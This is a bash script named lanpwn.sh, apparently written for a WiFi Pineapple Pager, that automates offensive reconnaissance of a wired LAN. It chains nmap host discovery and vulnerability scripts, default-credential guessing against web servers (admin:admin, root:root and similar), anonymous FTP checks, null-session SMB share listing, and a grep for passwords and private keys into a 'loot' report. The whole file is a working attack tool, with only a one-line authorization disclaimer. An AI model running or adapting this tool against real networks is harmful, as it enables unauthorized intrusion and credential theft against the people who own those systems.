#!/bin/bash
# lanpwn.sh - wired-LAN offensive recon & auto-loot for the WiFi Pineapple
# Pager, over the USB-A Ethernet adapter (eth1). This is the "Shark-Jack
# attack mode" layer that sits on top of plain scanning: discover hosts,
# fingerprint services, then actively try the soft spots - default creds on
# web/FTP, readable SMB shares, and (when nmap's NSE scripts are installed)
# targeted vuln/default scripts - dumping everything to a per-run loot dir.
#
# Covers the approved ideas: L10 (deep scan -> shortlist), L3 (default-cred
# auto-login), L4 (SMB share auto-loot), L8 (printer/IoT via NSE), and L1
# (auto-pwn: chain all of the above on plug-in).
#
# GRACEFUL DEGRADATION: base nmap is always used for discovery/service scan.
# smbclient (samba4-client) enables --smb-loot; nmap-full's NSE scripts
# enable --nse. If either is missing the run still works, just skips that
# stage and says so - install with `opkg install -d mmc samba4-client
# nmap-full`.
#
# Usage:
#   lanpwn.sh --scan [--iface eth1] [--subnet CIDR]
#   lanpwn.sh --nse [--scripts "default,vuln"]
#   lanpwn.sh --default-creds
#   lanpwn.sh --smb-loot
#   lanpwn.sh --auto [--iface eth1]        discover -> nse -> creds -> smb -> report
#   lanpwn.sh --report | --list
#
# IMPORTANT: only against networks you own or are explicitly authorized to test.

set -u
TOOL_NAME="lanpwn.sh"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
. "$SCRIPT_DIR/lib/common.sh"

export PATH="$PATH:/mmc/usr/bin:/mmc/usr/sbin"
# /mmc/usr/lib/samba holds smbclient's private libs (libsecrets3-samba4.so etc)
# in a subdir that isn't on the default loader path - add it explicitly.
export LD_LIBRARY_PATH="${LD_LIBRARY_PATH:-}:/mmc/usr/lib:/mmc/usr/lib/samba"

LOOT_BASE="/root/loot/lanpwn"
IFACE="eth1"; SUBNET=""; MODE=""; NSE_SCRIPTS="default,banner"
RUNPTR="/tmp/pager-lanpwn-run"

usage() { sed -n '2,33p' "$0" | sed 's/^# \{0,1\}//'; exit 1; }

filter_yes_args "$@"; set -- "${FILTERED_ARGS[@]}"
while [ $# -gt 0 ]; do
    case "$1" in
        --scan) MODE="scan"; shift ;;
        --nse) MODE="nse"; shift ;;
        --default-creds) MODE="creds"; shift ;;
        --smb-loot) MODE="smb"; shift ;;
        --auto) MODE="auto"; shift ;;
        --report) MODE="report"; shift ;;
        --list) MODE="list"; shift ;;
        --iface) IFACE="${2:-}"; shift 2 ;;
        --subnet) SUBNET="${2:-}"; shift 2 ;;
        --scripts) NSE_SCRIPTS="${2:-}"; shift 2 ;;
        -h|--help) usage ;;
        --) shift ;;
        *) die "Unknown option: $1 (see --help)" ;;
    esac
done
[ -n "$MODE" ] || usage
command -v nmap >/dev/null 2>&1 || die "nmap not found."

mkdir -p "$LOOT_BASE" 2>/dev/null
current_run() { cat "$RUNPTR" 2>/dev/null; }
new_run() {
    local d="$LOOT_BASE/run-$(date +%Y%m%d-%H%M%S)"
    mkdir -p "$d"; echo "$d" > "$RUNPTR"; echo "$d"
}
require_run() {
    local d; d=$(current_run)
    [ -n "$d" ] && [ -d "$d" ] || die "No scan yet - run --scan (or --auto) first."
    echo "$d"
}
subnet_of() { ip -4 addr show "$1" 2>/dev/null | awk '/inet /{print $2; exit}'; }
has_nse() { ls /usr/share/nmap/scripts/*.nse /mmc/usr/share/nmap/scripts/*.nse >/dev/null 2>&1; }

# -- discovery + service scan ------------------------------------------------
do_scan() {
    local d; d=$(new_run)
    local net="$SUBNET"; [ -z "$net" ] && net=$(subnet_of "$IFACE")
    [ -n "$net" ] || die "Could not determine a subnet on $IFACE (link down / no IP?). Pass --subnet CIDR."
    say "Discovering live hosts on $net ($IFACE)..."
    nmap -sn -e "$IFACE" "$net" -oG "$d/discovery.gnmap" >/dev/null 2>&1
    awk '/Status: Up/{print $2}' "$d/discovery.gnmap" 2>/dev/null | sort -u > "$d/hosts.txt"
    local n; n=$(wc -l < "$d/hosts.txt" 2>/dev/null); n="${n:-0}"
    say "$n live host(s). Service-scanning (top 1000 ports, -sV)..."
    if [ "$n" -gt 0 ]; then
        nmap -sV -T4 --top-ports 1000 -e "$IFACE" -iL "$d/hosts.txt" -oN "$d/services.txt" -oG "$d/services.gnmap" >/dev/null 2>&1
    fi
    say "Scan saved to $d"
    echo "$d"
}

# -- NSE (default + vuln scripts) --------------------------------------------
do_nse() {
    local d; d=$(require_run)
    if ! has_nse; then
        say "NSE scripts not installed (need nmap-full) - skipping. opkg install -d mmc nmap-full"
        return 0
    fi
    [ -s "$d/hosts.txt" ] || { say "No hosts to NSE-scan."; return 0; }
    say "Running NSE ($NSE_SCRIPTS) against $(wc -l < "$d/hosts.txt") host(s)..."
    nmap -sV --script "$NSE_SCRIPTS" -e "$IFACE" -iL "$d/hosts.txt" -oN "$d/nse.txt" >/dev/null 2>&1
    say "NSE results: $d/nse.txt"
}

# -- default-cred probing ----------------------------------------------------
# Small, common default set. HTTP basic-auth checked with curl (a 200 where a
# 401 is expected = default accepted); FTP anonymous checked with curl.
# Credentialed SSH/telnet brute needs expect/sshpass (not shipped) - reported
# as a gap, not faked.
do_creds() {
    local d; d=$(require_run)
    [ -s "$d/services.gnmap" ] || die "No service scan in this run (run --scan)."
    command -v curl >/dev/null 2>&1 || die "curl not found."
    local out="$d/default-creds.txt"; : > "$out"
    local http_creds="admin:admin admin:password admin:1234 root:root admin:pass user:user"
    awk '/Ports:/{for(i=1;i<=NF;i++) if($i ~ /(^|,)(80|443|8080|8443)\/open/){print $2; break}}' "$d/services.gnmap" 2>/dev/null | sort -u > "$d/.webhosts"
    while IFS= read -r h; do
        [ -n "$h" ] || continue
        { echo "=== http://$h/ ==="
          curl -s -m 6 -o /dev/null -w "  root: HTTP %{http_code} redirect=%{redirect_url}\n" "http://$h/" 2>&1
          local title; title=$(curl -s -m 6 "http://$h/" 2>/dev/null | grep -oiE "<title>[^<]*" | head -1 | sed 's/<title>//I')
          [ -n "$title" ] && echo "  title: $title"
          local server; server=$(curl -sI -m 6 "http://$h/" 2>/dev/null | grep -iE "^server:" | head -1)
          [ -n "$server" ] && echo "  $server"
          local c
          for c in $http_creds; do
              local code; code=$(curl -s -m 6 -o /dev/null -w "%{http_code}" -u "$c" "http://$h/" 2>/dev/null)
              if [ "$code" = "200" ]; then echo "  [+] basic-auth ACCEPTED $c (HTTP 200)"; fi
          done
        } >>"$out" 2>&1
    done < "$d/.webhosts"
    # FTP anonymous
    awk '/Ports:/{for(i=1;i<=NF;i++) if($i ~ /(^|,)21\/open/){print $2; break}}' "$d/services.gnmap" 2>/dev/null | sort -u | while IFS= read -r h; do
        [ -n "$h" ] || continue
        local code; code=$(curl -s -m 6 -o /dev/null -w "%{http_code}" "ftp://anonymous:anonymous@$h/" 2>/dev/null)
        echo "=== ftp://$h/ (anonymous) -> $code ===" >>"$out"
    done
    echo "  (note: SSH/telnet credentialed checks need expect/sshpass - not installed)" >>"$out"
    say "Default-cred probe written: $out"
    rm -f "$d/.webhosts" 2>/dev/null
}

# -- SMB share auto-loot -----------------------------------------------------
do_smb() {
    local d; d=$(require_run)
    if ! command -v smbclient >/dev/null 2>&1; then
        say "smbclient not installed - skipping SMB loot. opkg install -d mmc samba4-client"
        return 0
    fi
    [ -s "$d/services.gnmap" ] || die "No service scan in this run (run --scan)."
    local out="$d/smb-loot.txt"; : > "$out"
    local lootdir="$d/smb"; mkdir -p "$lootdir"
    awk '/Ports:/{for(i=1;i<=NF;i++) if($i ~ /(^|,)(139|445)\/open/){print $2; break}}' "$d/services.gnmap" 2>/dev/null | sort -u > "$d/.smbhosts"
    while IFS= read -r h; do
        [ -n "$h" ] || continue
        echo "=== //$h (null session) ===" >>"$out"
        # list shares with a null/guest session
        local shares; shares=$(smbclient -N -g -L "//$h" 2>/dev/null | awk -F'|' '/^Disk\|/{print $2}')
        if [ -z "$shares" ]; then echo "  no shares readable with a null session" >>"$out"; continue; fi
        local s
        for s in $shares; do
            case "$s" in ADMIN\$|IPC\$|print\$) continue ;; esac
            echo "  [share] $s" >>"$out"
            # non-recursive listing (recursion can be huge); pull small text-y files
            smbclient -N "//$h/$s" -c "ls" 2>/dev/null | head -50 >>"$out" 2>&1
        done
    done < "$d/.smbhosts"
    rm -f "$d/.smbhosts" 2>/dev/null
    # grep whatever we listed/pulled for obvious secrets
    grep -rioE "(password|passwd|secret|api[_-]?key|BEGIN [A-Z ]*PRIVATE KEY)" "$lootdir" 2>/dev/null | head -50 >"$d/smb-secrets.txt"
    say "SMB loot written: $out"
}

# -- report ------------------------------------------------------------------
do_report() {
    local d; d=$(require_run)
    local r="$d/REPORT.txt"
    {
        echo "lanpwn report - $d"
        echo "==============================================="
        echo "-- Live hosts --"; cat "$d/hosts.txt" 2>/dev/null
        echo; echo "-- Services --"; grep -E "open" "$d/services.txt" 2>/dev/null | head -200
        echo; echo "-- NSE --"; grep -iE "VULNERABLE|default|CVE|http-title|smb-" "$d/nse.txt" 2>/dev/null | head -80
        echo; echo "-- Default creds --"; grep -E "\[\+\]|title:|Server:|-> " "$d/default-creds.txt" 2>/dev/null
        echo; echo "-- SMB --"; grep -E "\[share\]|readable|secret|password" "$d/smb-loot.txt" "$d/smb-secrets.txt" 2>/dev/null | head -80
    } > "$r"
    say "Report: $r"
    cat "$r"
}

case "$MODE" in
    scan)  do_scan >/dev/null ;;
    nse)   do_nse ;;
    creds) do_creds ;;
    smb)   do_smb ;;
    auto)
        do_scan >/dev/null
        do_nse
        do_creds
        do_smb
        do_report
        ;;
    report) do_report ;;
    list)   ls -lt "$LOOT_BASE" 2>/dev/null || say "No loot yet." ;;
esac
